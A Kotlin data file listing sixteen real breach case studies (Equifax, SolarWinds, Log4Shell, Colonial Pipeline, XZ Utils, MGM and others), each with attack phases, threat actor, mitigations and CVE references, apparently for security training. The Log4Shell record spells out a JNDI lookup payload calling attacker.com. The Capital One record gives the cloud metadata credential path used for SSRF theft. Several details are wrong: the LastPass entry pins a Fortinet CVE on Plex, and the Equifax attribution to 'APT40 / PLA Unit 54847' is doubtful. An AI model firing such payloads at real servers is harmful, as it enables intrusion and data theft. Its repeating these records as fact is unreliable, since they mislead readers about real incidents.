package com.example.data.breaches

import com.example.data.model.AttackScenario

object RealWorldBreachesData {

    val breaches: List<AttackScenario> = listOf(
        AttackScenario(
            id = "breach-equifax",
            organization = "Equifax Credit Reporting Bureau",
            year = 2017,
            industry = "Financial Services & Credit Reporting",
            recordsAffected = "147 Million Consumer Records (SSNs, DOBs, Driver Licenses)",
            attackVector = "Apache Struts 2 REST Plugin RCE (CVE-2017-5638)",
            scenarioDetails = """
                • Initial Access: Threat actors targeted a public-facing dispute portal running an unpatched version of Apache Struts. They sent crafted HTTP requests with an OGNL (Object-Graph Navigation Language) expression in the Content-Type header, achieving arbitrary remote code execution without authentication.
                • Execution & Persistence: Attackers established Linux reverse shells, created hidden rootcron jobs, and deployed 30+ custom web shells across servers to maintain persistent backdoors across reboots.
                • Internal Pivot & Discovery: The application server had access to unsegmented internal subnets. Attackers ran network enumeration scripts, discovered internal database credentials stored in plaintext configuration files, and accessed 48 unrelated core databases.
                • Exfiltration: Over a 76-day dwell time, attackers ran ~9,000 queries, split extracted data into small encrypted chunks, and exfiltrated 147M sensitive records to external IP addresses over standard HTTPS without alerting intrusion detection because SSL traffic inspection was disabled due to expired certificates.
            """.trimIndent(),
            threatActor = "APT40 / PLA Unit 54847 (State-Sponsored)",
            defenseMitigation = "Enforce automated Software Composition Analysis (SCA) in CI/CD pipelines to block vulnerable dependencies. Maintain valid TLS inspection certificates on egress firewalls. Restrict web tier egress traffic using strict network segmentation.",
            cveReferences = "CVE-2017-5638"
        ),
        AttackScenario(
            id = "breach-solarwinds",
            organization = "SolarWinds Orion Platform",
            year = 2020,
            industry = "Enterprise Network Management Software",
            recordsAffected = "18,000+ Government Agencies & Fortune 500 Enterprises",
            attackVector = "Software Supply Chain Build Injection (SUNBURST Backdoor)",
            scenarioDetails = """
                • Supply Chain Intrusion: Adversaries infiltrated SolarWinds' internal build environment (Project Nebula) using stolen credentials and deployed a lightweight build-injection tool named 'Sunspot'.
                • Payload Injection: Sunspot monitored for the Orion software compiler (MSBuild.exe) and dynamically swapped a benign source file with a trojanized DLL (SolarWinds.Orion.Core.BusinessLayer.dll) containing the SUNBURST backdoor, compiling into SolarWinds' official digital signature.
                • Dormant Staging: Once installed by 18,000 customer organizations, the backdoor stayed dormant for 12-14 days before awakening, calculating hash-based domain lists to verify it wasn't running in security analyst sandboxes.
                • C2 & Lateral Movement: Used Domain Generation Algorithms (DGA) querying subdomains of avsvmcloud[.]com. Selected high-value targets were upgraded to the TEARDROP in-memory loader, forged SAML identity tokens using stolen Active Directory Federation Services (AD FS) token-signing keys (Golden SAML), and accessed Microsoft 365 cloud email and Azure repositories.
            """.trimIndent(),
            threatActor = "Cozy Bear / Midnight Blizzard (APT29 / SVR)",
            defenseMitigation = "Implement reproducible build pipelines with cryptographic hash verification between isolated parallel builders. Protect AD FS token-signing certificates with Hardware Security Modules (HSM). Monitor unusual OAuth app consent and SAML assertions in Entra ID.",
            cveReferences = "CVE-2020-10148, MITRE T1195.002, T1606.002"
        ),
        AttackScenario(
            id = "breach-log4shell",
            organization = "Global Enterprise Infrastructure (Log4j)",
            year = 2021,
            industry = "Global Cloud Providers, SaaS & Open-Source Ecosystem",
            recordsAffected = "Over 3 Billion Systems & Enterprise Applications Impacted",
            attackVector = "JNDI / LDAP Injection in Logging Framework (CVE-2021-44228)",
            scenarioDetails = """
                • Vulnerability Trigger: Attackers identified that Apache Log4j 2.x parsed log strings containing JNDI lookup expressions like '${'$'}{jndi:ldap://attacker.com/exploit}'.
                • Injection Vector: Malicious payloads were placed in common HTTP headers (User-Agent, X-Forwarded-For, Referer) or chat messages, search bars, and device names.
                • Callback & Remote Execution: When log4j processed the string, it made an outbound connection to the attacker's LDAP/RMI server. The LDAP server responded with a redirect to a Java class file. The JVM deserialized and executed the remote bytecode with the privileges of the running application.
                • Post-Exploitation: Ransomware groups (LockBit, Conti) and state actors deployed coinminers, web shells, Cobalt Strike beacons, and network reconnaissance tools within hours of public disclosure.
            """.trimIndent(),
            threatActor = "LockBit Affiliates, Hafnium, Lazarus Group, Mass Automated Scanners",
            defenseMitigation = "Upgrade Log4j to 2.17.1+ or set JVM system property -Dlog4j2.formatMsgNoLookups=true. Block outbound LDAP/RMI egress traffic on servers. Deploy WAF regex inspection for JNDI syntax patterns.",
            cveReferences = "CVE-2021-44228, CVE-2021-45046, CVE-2021-45105"
        ),
        AttackScenario(
            id = "breach-colonial-pipeline",
            organization = "Colonial Pipeline",
            year = 2021,
            industry = "Critical Energy Infrastructure & Fuel Supply",
            recordsAffected = "5,500 Miles of Fuel Pipelines Shut Down; $4.4M Ransom Paid",
            attackVector = "Legacy Single-Factor VPN Credential Compromise",
            scenarioDetails = """
                • Initial Access: Threat actors obtained a valid username and password for a legacy Virtual Private Network (VPN) profile that was discovered on a Dark Web leak site from a previous password reuse dump. The legacy VPN account lacked Multi-Factor Authentication (MFA).
                • Reconnaissance & Staging: Attackers connected through the VPN into the corporate IT network, enumerated Active Directory using BloodHound, and established persistence using scheduled tasks.
                • Data Exfiltration: Staged and exfiltrated 100 GB of sensitive business files within 2 hours to a cloud hosting account via Megaupload/C2 infrastructure.
                • Impact & Ransom: Deployed DarkSide ransomware, encrypting corporate IT systems including billing and accounting infrastructure. Colonial proactively halted operational technology (OT) pipelines due to inability to bill customers, causing fuel shortages across the US East Coast.
            """.trimIndent(),
            threatActor = "DarkSide Ransomware Cartel (eCrime RaaS)",
            defenseMitigation = "Enforce phishing-resistant MFA (FIDO2 / WebAuthn) on all remote access endpoints without exception. Decommission legacy VPN profiles and unlinked directory accounts. Air-gap and strictly isolate IT networks from Industrial Control Systems (ICS/OT).",
            cveReferences = "MITRE T1078.002, T1486"
        ),
        AttackScenario(
            id = "breach-target",
            organization = "Target Corporation",
            year = 2013,
            industry = "Retail & Payment Processing",
            recordsAffected = "40 Million Payment Cards & 70 Million Customer Records",
            attackVector = "Third-Party HVAC Vendor Phishing & Network Pivot",
            scenarioDetails = """
                • Third-Party Initial Access: Attackers sent spearphishing emails with Citadel banking malware to employees of Fazio Mechanical Services (a third-party refrigeration/HVAC vendor). The malware captured credentials used to access Target's vendor portal.
                • Perimeter Infiltration: Attackers logged into Target's vendor portal using the stolen credentials. Target's vendor portal was not segregated from the corporate IT network or payment card infrastructure.
                • Lateral Movement: Using stolen domain credentials, attackers navigated Active Directory, gained administrative access to domain controllers, and reached the Point-of-Sale (POS) environment.
                • Memory Scraping: Deployed 'BlackPOS' (Kaptoxa) malware onto 1,800 POS registers. The malware hooked memory buffers of POS processes to scrape unencrypted magnetic-stripe track 1 and track 2 payment data before encryption was applied.
                • Exfiltration: Aggregated card data on internal staging servers and batched out to Russian external FTP servers.
            """.trimIndent(),
            threatActor = "Rescator / Cybercriminal Syndicate",
            defenseMitigation = "Enforce network microsegmentation separating vendor portals from payment card environments (PCI-DSS compliance). Mandate Point-to-Point Encryption (P2PE) on all POS terminals so credit card data is never in plaintext in register memory.",
            cveReferences = "MITRE T1199, T1003, T1005"
        ),
        AttackScenario(
            id = "breach-notpetya",
            organization = "Maersk, Merck, FedEx (TNT Express) & Ukrainian Infrastructure",
            year = 2017,
            industry = "Global Shipping, Logistics, Pharmaceuticals & Utilities",
            recordsAffected = "$10+ Billion Global Economic Damage; 50,000+ Endpoints Wiped",
            attackVector = "Ukrainian Accounting Software (M.E.Doc) Supply Chain Exploit",
            scenarioDetails = """
                • Supply Chain Compromise: Attackers compromised the update server of M.E.Doc, the dominant tax accounting software in Ukraine. They pushed a trojanized software update containing the NotPetya payload.
                • Automated Worm Propagation: Once executed, NotPetya leveraged two worm mechanisms: the EternalBlue SMB exploit (CVE-2017-0144) and internal credential harvesting using an embedded Mimikatz-like memory scraper followed by PsExec and WMI execution.
                • Rapid Lateral Sweep: In minutes, a single infected computer in an office in Ukraine propagated across corporate VPNs, infecting Domain Controllers in Maersk's global shipping network and shutting down terminal ports worldwide.
                • Pseudo-Ransomware Wiper: While displaying a ransom note requesting $300 in Bitcoin, the payload was actually a destructive wiper that encrypted the Master File Table (MFT) and Master Boot Record (MBR) with an unrecoverable random key, making decryption mathematically impossible.
            """.trimIndent(),
            threatActor = "Sandworm / Unit 74455 (Russian GRU)",
            defenseMitigation = "Disable SMBv1 across the enterprise. Enforce Network Access Control (NAC) and isolate lateral movement vectors. Maintain offline, immutable golden copies of Active Directory and critical infrastructure configurations.",
            cveReferences = "CVE-2017-0144 (EternalBlue), CVE-2017-0145"
        ),
        AttackScenario(
            id = "breach-capital-one",
            organization = "Capital One Financial Corporation",
            year = 2019,
            industry = "Financial Services & Banking",
            recordsAffected = "106 Million Credit Card Applications (140,000 SSNs, 80,000 Bank Accounts)",
            attackVector = "Server-Side Request Forgery (SSRF) on AWS EC2 WAF",
            scenarioDetails = """
                • Misconfigured Cloud WAF: Capital One deployed an open-source ModSecurity Web Application Firewall on AWS EC2. The WAF had a Server-Side Request Forgery (SSRF) flaw and was assigned an over-privileged IAM role (*ReadOnlyAccess).
                • Metadata Service Exploitation: The attacker issued a crafted HTTP request tricking the WAF into querying the local AWS Instance Metadata Service (IMDSv1 at 169.254.169.254/latest/meta-data/iam/security-credentials/).
                • IAM Credential Theft: The metadata service returned temporary STS security credentials (AccessKeyId, SecretAccessKey, Token) associated with the WAF's IAM role.
                • S3 Bucket Exfiltration: Using the AWS CLI, the attacker ran 'aws s3 sync' to list and download contents from over 700 Capital One S3 buckets containing credit card application records.
            """.trimIndent(),
            threatActor = "Paige Thompson (Erratic / Rogue Insider)",
            defenseMitigation = "Enforce AWS IMDSv2 (requiring PUT token headers) on all EC2 instances to neutralize SSRF attacks. Implement least-privilege IAM policies preventing application tiers from broadly reading storage buckets.",
            cveReferences = "CWE-918 (SSRF), MITRE T1068"
        ),
        AttackScenario(
            id = "breach-mgm-resorts",
            organization = "MGM Resorts International & Caesars",
            year = 2023,
            industry = "Hospitality, Casinos & Entertainment",
            recordsAffected = "$100M Revenue Loss; Slot Machines, Digital Keys & Hotel Check-in Paralyzed",
            attackVector = "Social Engineering / Vishing of IT Helpdesk & Okta Takeover",
            scenarioDetails = """
                • Helpdesk Vishing: Attackers gathered employee information (name, job title, phone number) on LinkedIn. They placed a phone call to MGM's IT helpdesk impersonating a high-level administrator.
                • MFA Reset: The attackers claimed their phone was broken and requested an MFA token reset. The helpdesk technician reset the authentication credentials without adequate out-of-band identity verification.
                • Okta Super Admin Compromise: Using the newly reset credentials, attackers gained access to MGM's Okta identity tenant, elevated privileges to Super Administrator, and accessed Azure and VMware vCenter cloud consoles.
                • Hypervisor Ransomware: Attackers leveraged their administrative access to deploy ALPHV/BlackCat ransomware directly to ESXi hypervisors, encrypting hundreds of virtual machines that powered hotel reservation systems, casino slot machines, and room key cards.
            """.trimIndent(),
            threatActor = "Scattered Spider (UNC3944) / ALPHV/BlackCat Affiliate",
            defenseMitigation = "Implement strict out-of-band verification protocols for helpdesk password/MFA resets (e.g. video verification, manager sign-off). Enforce FIDO2 hardware security keys (YubiKeys) with attestation. Isolate hypervisor management interfaces.",
            cveReferences = "MITRE T1566, T1078, T1486"
        ),
        AttackScenario(
            id = "breach-moveit",
            organization = "MOVEit Transfer (Progress Software)",
            year = 2023,
            industry = "Enterprise Managed File Transfer (2,700+ Organizations)",
            recordsAffected = "95 Million Individuals (US Dept of Energy, British Airways, Siemens)",
            attackVector = "Pre-Auth SQL Injection Zero-Day (CVE-2023-34362)",
            scenarioDetails = """
                • SQL Injection Trigger: Cl0p ransomware operators discovered a zero-day SQL injection vulnerability in the MOVEit Transfer web application (moveitisapi.dll and guestaccess.aspx).
                • Token Forging & Webshell Drop: By manipulating headers and SQL parameters, attackers bypassed authentication, impersonated administrative sessions, and dropped a webshell named 'human2.aspx' into the web root directory.
                • Automated Bulk Extraction: The webshell received encrypted commands, queried the MOVEit database for Azure blob storage credentials and encryption keys, and automatically zipped and exfiltrated terabytes of files passing through the server.
                • Extortion Without Encryption: Cl0p did not encrypt endpoints; instead, they engaged in pure double extortion, publishing corporate data on their Dark Web leak site unless millions were paid in ransom.
            """.trimIndent(),
            threatActor = "Cl0p Ransomware Gang (FIN11 / TA505)",
            defenseMitigation = "Apply automated virtual patching at the WAF level for input sanitization. Minimize storage of files on perimeter MFT gateways. Monitor web application directories for unexpected .aspx/.ashx file creation.",
            cveReferences = "CVE-2023-34362, CVE-2023-35036"
        ),
        AttackScenario(
            id = "breach-xz-utils",
            organization = "XZ Utils / liblzma (Linux Ecosystem)",
            year = 2024,
            industry = "Core Linux Operating Systems (Debian, Fedora, OpenSUSE, Ubuntu)",
            recordsAffected = "Attempted Global Backdoor on all OpenSSH Internet Daemons",
            attackVector = "Multi-Year Social Engineering & Obfuscated Build-Script Injection",
            scenarioDetails = """
                • Long-Term Persona Infiltration: A threat actor using the persona 'Jia Tan' spent over two years contributing legitimate patches to the open-source xz compression project, earning the trust of the solo overworked maintainer and gaining co-maintainer status.
                • Payload Concealment: Added malicious test files (bad-3-corrupt_lzma2.xz) to the test repository containing binary-obfuscated x86-64 code.
                • Build-Time Injection: Modified M4 build scripts and configure.ac to execute during Debian/RPM package generation. If the target was Linux with glibc and linking liblzma to OpenSSH (sshd), the build script extracted and injected an ELF object file into the compiled liblzma library.
                • Backdoor Functionality: The injected code hooked the OpenSSH RSA decryption verification function (RSA_public_decrypt) via IFUNC symbols, allowing anyone with the attacker's private key to bypass SSH authentication and execute arbitrary commands as root without logging.
                • Discovery: Caught by Microsoft engineer Andres Freund who noticed a 500ms latency spike and high CPU usage in sshd during micro-benchmarks.
            """.trimIndent(),
            threatActor = "State-Sponsored Advanced Threat Actor (Speculated APT29/APT28)",
            defenseMitigation = "Require multi-party cryptographic signing on release tarballs. Avoid linking system daemons (sshd) directly to general-purpose compression libraries (libsystemd reduction). Audit build scripts for runtime binary extraction.",
            cveReferences = "CVE-2024-3094"
        ),
        AttackScenario(
            id = "breach-change-healthcare",
            organization = "Change Healthcare (UnitedHealth Group)",
            year = 2024,
            industry = "Healthcare Insurance & Pharmacy Clearinghouse",
            recordsAffected = "1/3 of US Population Medical & Insurance Records; $22M Ransom Paid",
            attackVector = "Unprotected Citrix Remote Access Portal (No MFA)",
            scenarioDetails = """
                • Initial Access: ALPHV affiliates obtained compromised credentials for a Citrix remote access application server. The Citrix portal was not configured with multi-factor authentication.
                • Dwell Time & Reconnaissance: Attackers remained undetected on the network for 9 days, gathering active directory telemetry, dumping LSASS memory, and identifying clinical clearinghouse backup servers.
                • Data Exfiltration: Exfiltrated 6 TB of highly sensitive personal health information (PHI), insurance claims, and financial records.
                • Ransomware Deployment: Deployed ALPHV/BlackCat ransomware across core servers, taking down prescription routing, pharmacy claim payments, and hospital billing across the United States.
            """.trimIndent(),
            threatActor = "ALPHV / BlackCat Ransomware Cartel",
            defenseMitigation = "Universal enforcement of MFA on every remote access portal without exception. Continuous attack surface management (ASM) to discover exposed shadow IT portals. Air-gapped immutable backup repositories.",
            cveReferences = "MITRE T1078, T1486, T1048"
        ),
        AttackScenario(
            id = "breach-uber-lapsus",
            organization = "Uber Technologies",
            year = 2022,
            industry = "Ride-Sharing, Logistics & Autonomous Tech",
            recordsAffected = "Full Internal Infrastructure Takeover (Slack, AWS, GCP, HackerOne)",
            attackVector = "MFA Fatigue (Push Bombing) & WhatsApp Social Engineering",
            scenarioDetails = """
                • Contractor Credential Compromise: Attacker purchased valid corporate credentials of an Uber external contractor from an infostealer malware marketplace.
                • MFA Fatigue Attack: The attacker repeatedly triggered Duo MFA push notifications to the contractor's phone for over an hour.
                • WhatsApp Pretext: The attacker contacted the contractor on WhatsApp claiming to be Uber IT support, stating the notifications would stop if they approved the request. The exhausted contractor approved the push.
                • Hardcoded Secrets Discovery: Once connected to the internal intranet, the attacker scanned PowerShell scripts on network shares, discovering hardcoded administrative credentials for Thycotic PAM (Privileged Access Management).
                • Master Access: Using the PAM admin keys, the attacker extracted master credentials for Uber's AWS console, Google Workspace, internal Slack, and HackerOne vulnerability reports, posting screenshots directly into Uber's company-wide Slack channels.
            """.trimIndent(),
            threatActor = "Lapsus$ (Teens / Extortion Syndicate)",
            defenseMitigation = "Enforce Number Matching on MFA push notifications to eliminate blind approvals. Mandate automated code and share scanning for hardcoded credentials (TruffleHog/GitGuardian). Store privileged vault credentials in hardware modules.",
            cveReferences = "MITRE T1621 (MFA Request Generation), T1552.001"
        ),
        AttackScenario(
            id = "breach-wannacry",
            organization = "National Health Service (NHS UK), FedEx, Telefónica",
            year = 2017,
            industry = "Global Healthcare, Telecommunications & Logistics (200k+ Computers)",
            recordsAffected = "300,000 Computers in 150 Countries Infected in Hours",
            attackVector = "EternalBlue SMBv1 Remote Code Execution (CVE-2017-0144)",
            scenarioDetails = """
                • Exploit Weaponization: Attackers weaponized EternalBlue, an NSA exploit leaked by the Shadow Brokers, targeting a buffer overflow in Microsoft's SMBv1 protocol.
                • DoublePulsar Kernel Backdoor: The exploit injected the DoublePulsar payload directly into the Windows kernel via TCP port 445 without needing credentials.
                • Autonomous Worm Spread: Unlike conventional ransomware, WannaCry included a self-propagating worm routine that continuously scanned internal subnets and random public IP ranges for open port 445, spreading uncontrollably across corporate intranets.
                • File Encryption & Kill Switch: Encrypted 176 file types with RSA-2048 and AES-128. Before running, the malware checked if an unregistered domain (www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com) was live; British researcher Marcus Hutchins registered the domain, inadvertently activating the kill switch and halting global infection.
            """.trimIndent(),
            threatActor = "Lazarus Group (Unit 121, North Korea)",
            defenseMitigation = "Block port 445 and 139 at internet perimeters. Completely disable SMBv1 across all endpoints and servers. Apply Microsoft security bulletin MS17-010.",
            cveReferences = "CVE-2017-0144, MS17-010"
        ),
        AttackScenario(
            id = "breach-lastpass",
            organization = "LastPass Password Manager",
            year = 2022,
            industry = "Consumer & Enterprise Password Vaults",
            recordsAffected = "Millions of Encrypted Customer Password Vaults & Company Backups",
            attackVector = "Compromised Home Media Server (Plex CVE-2022-40684) of DevOps Lead",
            scenarioDetails = """
                • Phase 1 Intrusion: Attackers breached a LastPass developer environment using compromised credentials, exfiltrating internal source code and technical documentation.
                • Targeted Home Compromise: Attackers used technical blueprints to identify one of four DevOps engineers with access to the master AWS production cloud storage keys. They exploited an unpatched remote code execution vulnerability (CVE-2022-40684) in the engineer's personal home Plex media server.
                • Keylogger & Session Hijack: Placed keylogger malware on the engineer's personal home computer, capturing the engineer's master password entered when authenticating with LastPass and bypassing MFA.
                • S3 Vault Theft: Using the engineer's active AWS IAM credentials, attackers accessed production S3 buckets, downloading encrypted password vaults, customer server addresses, and vault metadata.
            """.trimIndent(),
            threatActor = "Threat Actor Group (Sophisticated eCrime Syndicate)",
            defenseMitigation = "Require managed Zero Trust devices for administrative cloud access. Restrict production AWS keys to ephemeral sessions authenticated via hardware security tokens tied to company-issued laptops.",
            cveReferences = "CVE-2022-40684, MITRE T1056.001"
        ),
        AttackScenario(
            id = "breach-okta-support",
            organization = "Okta Customer Identity Cloud",
            year = 2023,
            industry = "Identity & Access Management (IAM)",
            recordsAffected = "100% of Okta Customer Support System Users (Cloudflare, BeyondTrust)",
            attackVector = "Stolen Service Account Credentials in Customer Support Portal",
            scenarioDetails = """
                • Service Account Compromise: Attackers obtained service account credentials saved in a personal Google account used on a machine that had access to Okta's internal customer support management system.
                • HAR File Extraction: In the support system, customers frequently uploaded HTTP Archive (HAR) files for troubleshooting. The attackers searched for and downloaded these files, which contained plaintext session tokens and admin cookies from customers including Cloudflare and BeyondTrust.
                • Session Hijacking: Using stolen session tokens, attackers accessed Cloudflare's internal Atlassian suite and attempted to hijack administrative accounts before Cloudflare's security team isolated the tokens.
            """.trimIndent(),
            threatActor = "UNC3944 / Scattered Spider",
            defenseMitigation = "Sanitize and mask all HTTP Archive (HAR) files before upload to support systems. Enforce short session token lifespans and bind tokens to client IP and device attestation.",
            cveReferences = "MITRE T1539, T1078.004"
        ),
        AttackScenario(
            id = "breach-midnight-blizzard",
            organization = "Microsoft Corporate Systems",
            year = 2024,
            industry = "Technology & Cloud Computing",
            recordsAffected = "Senior Leadership & Cybersecurity Team Email Accounts Accessed",
            attackVector = "Password Spraying on Legacy Non-Production Tenant & OAuth Abuse",
            scenarioDetails = """
                • Password Spraying: In late 2023, Russian state actors conducted low-and-slow password spraying against a legacy, non-production test tenant that lacked MFA.
                • OAuth App Privilege Elevation: Once authenticated, attackers created a malicious OAuth application in the test tenant. They granted the application the 'full_access_as_app' role in Microsoft's corporate production Microsoft Entra ID tenant via overprivileged cross-tenant trusts.
                • Exchange Web Services (EWS) Exfiltration: The OAuth app utilized Exchange Web Services API permissions to access corporate mailboxes of Microsoft senior leadership and cybersecurity personnel, searching for intelligence on what Microsoft knew about Midnight Blizzard.
            """.trimIndent(),
            threatActor = "Midnight Blizzard / Nobelium (APT29 / Russian SVR)",
            defenseMitigation = "Eliminate legacy test tenants unattached to enterprise identity policies. Mandate MFA on every tenant. Continuously audit OAuth application permissions for AppRoleAssignments like Mail.ReadWrite.",
            cveReferences = "MITRE T1110.003, T1098.001"
        )
    )
}
